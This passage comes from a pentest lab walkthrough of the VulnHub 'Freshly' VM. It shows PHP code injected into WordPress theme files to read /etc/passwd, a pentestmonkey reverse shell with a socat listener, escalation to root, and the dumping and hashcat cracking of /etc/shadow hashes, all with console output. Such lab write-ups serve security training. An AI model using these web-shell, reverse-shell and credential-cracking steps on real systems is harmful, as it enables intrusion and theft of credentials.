<p>An alternative approach is to follow <a class="reference external" href="http://matthieukeller.com/2015/04/vulnhub-freshly.html">Vulnhub - Freshly</a> and add exploit php code to the footer.php file (making the modifications very obvious to all WordPress users). On the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> admin page select <span class="menuselection">Appearance ‣ Editor ‣ Footer (footer.php)</span>, add the following php code to <code class="file docutils literal"><span class="pre">footer.php</span></code> just prior to the “&lt;/body&gt;” tag, then select <span class="menuselection">Update File</span>:</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">passthru</span><span class="p">(</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>To perform the exploit:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent http://<span class="nv">$T</span>:8080/wordpress/ <span class="p">|</span> <span class="se">\</span>
    sed -n <span class="s1">&#39;/^root/,$p&#39;</span>
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> curl --silent http://<span class="nv">$T</span>:8080/wordpress/ <span class="p">|</span> sed -n <span class="s1">&#39;/^root/,$p&#39;</span>
</span><span class="go">root:x:0:0:root:/root:/bin/bash</span>
<span class="go">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
<span class="go">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
<span class="go">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
<span class="go">sync:x:4:65534:sync:/bin:/bin/sync</span>
<span class="go">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
<span class="go">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
<span class="go">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
<span class="go">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
<span class="go">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
<span class="go">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
<span class="go">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
<span class="go">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
<span class="go">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
<span class="go">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
<span class="go">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
<span class="go">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
<span class="go">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
<span class="go">libuuid:x:100:101::/var/lib/libuuid:</span>
<span class="go">syslog:x:101:104::/home/syslog:/bin/false</span>
<span class="go">messagebus:x:102:105::/var/run/dbus:/bin/false</span>
<span class="go">user:x:1000:1000:user,,,:/home/user:/bin/bash</span>
<span class="go">mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false</span>
<span class="go">candycane:x:1001:1001::/home/candycane:</span>
<span class="hll"><span class="gp">#</span> YOU STOLE MY SECRET FILE!
</span><span class="hll"><span class="gp">#</span> <span class="nv">SECRET</span> <span class="o">=</span> <span class="s2">&quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
</span><span class="go">&lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="getting-a-reverse-shell-and-root">
<h3>3.18.3.4. Getting a reverse shell and root<a class="headerlink" href="#getting-a-reverse-shell-and-root" title="Permalink to this headline">¶</a></h3>
<p>This one will be better for 2 reasons. First, a reverse shell is opened leading to getting root. Second, it updates <code class="file docutils literal"><span class="pre">404.php</span></code> which is less obvious than changing the often-used <code class="file docutils literal"><span class="pre">footer.php</span></code>. This is a combination of various reverse shell writeups on the web: <a class="reference external" href="http://rastamouse.me/blog/2015/tophatsec-freshly/">TopHatSec: Freshly</a> and <a class="reference external" href="http://www.mogozobo.com/?p=2468">A freshly squeezed cup of pwnage</a>.</p>
<p><a class="reference external" href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey php-reverse-shell</a> is already available on Kali:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
locate php <span class="p">|</span> grep reverse
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> locate php <span class="p">|</span> grep reverse
</span><span class="go">/usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php</span>
<span class="go">/usr/share/laudanum/php/php-reverse-shell.php</span>
<span class="hll"><span class="go">/usr/share/webshells/php/php-reverse-shell.php</span>
</span></pre></div>
</div>
<p>Kali’s <code class="file docutils literal"><span class="pre">/usr/share/webshells/php/php-reverse-shell.php</span></code> is the pentestmonkey <code class="file docutils literal"><span class="pre">php-reverse-shell.php</span></code>.</p>
<p>On the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> admin page select <span class="menuselection">Appearance ‣ Editor ‣ 404 Template (404.php)</span>, replace the contents with <code class="file docutils literal"><span class="pre">/usr/share/webshells/php/php-reverse-shell.php</span></code> php code. Edit the following 2 lines to reflect your attack machine’s ip &amp; port used:</p>
<div class="highlight-perl"><div class="highlight"><pre><span></span><span class="nv">$ip</span> <span class="o">=</span> <span class="s">&#39;127.0.0.1&#39;</span><span class="p">;</span>  <span class="sr">//</span> <span class="n">CHANGE</span> <span class="n">THIS</span>
<span class="nv">$port</span> <span class="o">=</span> <span class="mi">1234</span><span class="p">;</span>       <span class="sr">//</span> <span class="n">CHANGE</span> <span class="n">THIS</span>
</pre></div>
</div>
<p>At this point save your edits via <span class="menuselection">Update File</span>.</p>
<p>On your attack machine fire up a listener:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># fire up a listener</span>
socat - TCP-LISTEN:1234
</pre></div>
</div>
<p>Then in a separate window kick off the shell:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
curl --silent http://<span class="nv">$T</span>:8080/wordpress/404.php
</pre></div>
</div>
<p>Now you’ll get a tty-less shell back on your <strong class="program">socat</strong> terminal. Following <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> you’ll run the following in your reverse shell to correct the problem of being tty-less:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>
</div>
<p>Here goes our exploit console. Notice that <code class="file docutils literal"><span class="pre">/etc/shadow</span></code> has improper permissions and we could use that for a brute force password cracking. But it turns out that root uses the admin password of “SuperSecretPassword”:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> socat - TCP-LISTEN:1234
</span><span class="go">Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux</span>
<span class="go"> 14:38:12 up  2:39,  0 users,  load average: 0.00, 0.01, 0.05</span>
<span class="go">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
<span class="hll"><span class="go">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span>
</span><span class="hll"><span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
</span><span class="hll"><span class="gp">$</span> <span class="c1"># no tty so we cannot su to root, so get a tty via python</span>
</span><span class="hll"><span class="gp">$</span> python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class="hll"><span class="gp">daemon@Freshly:/$ #</span> try a password <span class="k">for</span> root that we already know
</span><span class="hll"><span class="gp">daemon@Freshly:/$</span> su - root
</span><span class="hll"><span class="go">su - root</span>
</span><span class="hll"><span class="go">Password: SuperSecretPassword</span>
</span><span class="hll">
</span><span class="hll"><span class="gp">root@Freshly:~# #</span> it worked - root
</span><span class="hll"><span class="gp">root@Freshly:~#</span> id
</span><span class="hll"><span class="go">id</span>
</span><span class="hll"><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</span></pre></div>
</div>
<p>We’re root and so done. But what if that didn’t work? Let’s back out of root and do some recon to see if we can get at <code class="file docutils literal"><span class="pre">/etc/shadow</span></code> and crack the passwords.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">root@Freshly:~#</span> <span class="nb">exit</span>
</span><span class="hll"><span class="gp">daemon@Freshly:/$</span> ls -l /etc/shadow
</span><span class="hll"><span class="go">ls -l /etc/shadow</span>
</span><span class="hll"><span class="go">-rwxr-xr-x 1 root shadow 1030 Feb 17 01:56 /etc/shadow</span>
</span><span class="hll"><span class="gp">daemon@Freshly:/$</span> cat /etc/shadow
</span><span class="hll"><span class="go">cat /etc/shadow</span>
</span><span class="hll"><span class="gp">root:$6$If.Y9A3d$</span>L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
</span><span class="go">daemon:*:16483:0:99999:7:::</span>
<span class="go">bin:*:16483:0:99999:7:::</span>
<span class="go">sys:*:16483:0:99999:7:::</span>
<span class="go">sync:*:16483:0:99999:7:::</span>
<span class="go">games:*:16483:0:99999:7:::</span>
<span class="go">man:*:16483:0:99999:7:::</span>
<span class="go">lp:*:16483:0:99999:7:::</span>
<span class="go">mail:*:16483:0:99999:7:::</span>
<span class="go">news:*:16483:0:99999:7:::</span>
<span class="go">uucp:*:16483:0:99999:7:::</span>
<span class="go">proxy:*:16483:0:99999:7:::</span>
<span class="go">www-data:*:16483:0:99999:7:::</span>
<span class="go">backup:*:16483:0:99999:7:::</span>
<span class="go">list:*:16483:0:99999:7:::</span>
<span class="go">irc:*:16483:0:99999:7:::</span>
<span class="go">gnats:*:16483:0:99999:7:::</span>
<span class="go">nobody:*:16483:0:99999:7:::</span>
<span class="go">libuuid:!:16483:0:99999:7:::</span>
<span class="go">syslog:*:16483:0:99999:7:::</span>
<span class="go">messagebus:*:16483:0:99999:7:::</span>
<span class="hll"><span class="gp">user:$6$MuqQZq4i$</span>t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
</span><span class="go">mysql:!:16483:0:99999:7:::</span>
<span class="hll"><span class="gp">candycane:$6$gfTgfe6A$</span>pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
</span><span class="gp">#</span> YOU STOLE MY PASSWORD FILE!
<span class="gp">#</span> <span class="nv">SECRET</span> <span class="o">=</span> <span class="s2">&quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
</pre></div>
</div>
<p>Let’s try and crack the hashes on our Kali Linux box using <strong class="program">hashcat</strong>. Cut and paste <code class="file docutils literal"><span class="pre">/etc/shadow</span></code> into <code class="file docutils literal"><span class="pre">$JOB/hashcat/shadow.txt</span></code> on Kali; once that’s done run the following to convert that to <strong class="program">hashcat</strong> format and crack the password:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/hashcat
<span class="hll"><span class="c1"># cut and paste /etc/shadow into shadow.txt</span>
</span><span class="hll"><span class="c1"># get rid of everything except for the actual hash</span>
</span><span class="hll">cut -d: -f2 shadow.txt <span class="p">|</span> grep <span class="s1">&#39;^$6\$&#39;</span> &gt; hashes.txt
</span><span class="c1"># boo - running hashid defaults to python3 which fails on Kali</span>
<span class="c1">#   so force python2</span>
<span class="hll">python2 <span class="k">$(</span>which hashid<span class="k">)</span> -m hashes.txt
</span><span class="c1"># hashcat mode 1800 it is ...</span>
<span class="c1"># add our known possible password to the rockyou list</span>
<span class="hll"><span class="nb">echo</span> <span class="s2">&quot;SuperSecretPassword&quot;</span> &gt; wordlist.txt
</span><span class="hll">zcat /usr/share/wordlists/rockyou* &gt;&gt; wordlist.txt
</span><span class="c1"># run hashcat</span>
<span class="hll">hashcat --hash-type<span class="o">=</span><span class="m">1800</span> --potfile-disable hashes.txt wordlist.txt <span class="p">|</span> <span class="se">\</span>
</span><span class="hll">    tee cracked.txt
</span></pre></div>
</div>
<p>Running this gives us our password:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$ #</span> <span class="nb">cd</span> <span class="nv">$JOB</span>/hashcat
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span> cut and paste /etc/shadow into shadow.txt
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span> get rid of everything except <span class="k">for</span> the actual <span class="nb">hash</span>
<span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$</span> cut -d: -f2 shadow.txt <span class="p">|</span> grep <span class="s1">&#39;^$6\$&#39;</span> &gt; hashes.txt
</span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span> boo - running hashid defaults to python3 which fails on Kali
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span>   so force python2
<span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ python2 $</span><span class="o">(</span>which hashid<span class="o">)</span> -m hashes.txt
</span><span class="go">--File &#39;hashes.txt&#39;--</span>
<span class="go">Analyzing &#39;$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/&#39;</span>
<span class="hll"><span class="go">[+] SHA-512 Crypt [Hashcat Mode: 1800]</span>
</span><span class="go">Analyzing &#39;$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31&#39;</span>
<span class="go">[+] SHA-512 Crypt [Hashcat Mode: 1800]</span>
<span class="go">Analyzing &#39;$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/&#39;</span>
<span class="go">[+] SHA-512 Crypt [Hashcat Mode: 1800]</span>
<span class="go">--End of file &#39;hashes.txt&#39;--</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span> hashcat mode <span class="m">1800</span> it is ...
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span> add our known possible password to the rockyou list
<span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$</span> <span class="nb">echo</span> <span class="s2">&quot;SuperSecretPassword&quot;</span> &gt; wordlist.txt
</span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$</span> zcat /usr/share/wordlists/rockyou* &gt;&gt; wordlist.txt
</span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span> run hashcat
<span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$</span> hashcat --hash-type<span class="o">=</span><span class="m">1800</span> --potfile-disable hashes.txt wordlist.txt <span class="p">|</span> <span class="se">\</span>
</span><span class="hll">&gt;     tee cracked.txt
</span><span class="go">Initializing hashcat v0.49 with 1 threads and 32mb segment-size...</span>

<span class="go">Added hashes from file hashes.txt: 3 (3 salts)</span>

<span class="go">NOTE: press enter for status-screen</span>

<span class="hll"><span class="gp">$</span><span class="m">6</span><span class="nv">$If</span>.Y9A3d<span class="nv">$L1</span>/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:SuperSecretPassword
</span><span class="gp">$</span><span class="m">6</span><span class="nv">$MuqQZq4i$t</span>/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:SuperSecretPassword
<span class="gp">$</span><span class="m">6</span><span class="nv">$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa</span>/:password

<span class="go">All hashes have been recovered</span>

<span class="go">Input.Mode: Dict (wordlist.txt)</span>
<span class="go">Index.....: 1/5 (segment), 3627172 (words), 33550348 (bytes)</span>
<span class="go">Recovered.: 3/3 hashes, 3/3 salts</span>
<span class="go">Speed/sec.: - plains, - words</span>
<span class="go">Progress..: 8/3627172 (0.00%)</span>
<span class="go">Running...: --:--:--:--</span>
<span class="go">Estimated.: --:--:--:--</span>

<span class="go">Started: Tue May 26 23:12:37 2015</span>
<span class="go">Stopped: Tue May 26 23:12:38 2015</span>
</pre></div>
</div>
<p>With the cracked password we can get root as before on Freshly:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">daemon@Freshly:/$</span> su - root
</span><span class="hll"><span class="go">su - root</span>
</span><span class="hll"><span class="go">Password: SuperSecretPassword</span>
</span><span class="hll">
</span><span class="hll"><span class="gp">root@Freshly:~#</span> id
</span><span class="hll"><span class="go">id</span>
</span><span class="hll"><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</span></pre></div>
</div>
<p>We’re root and so done.</p>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="zorz.html" class="btn btn-neutral float-right" title="3.19. ZorZ" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="holynix1.html" class="btn btn-neutral" title="3.17. Holynix1" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.2',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>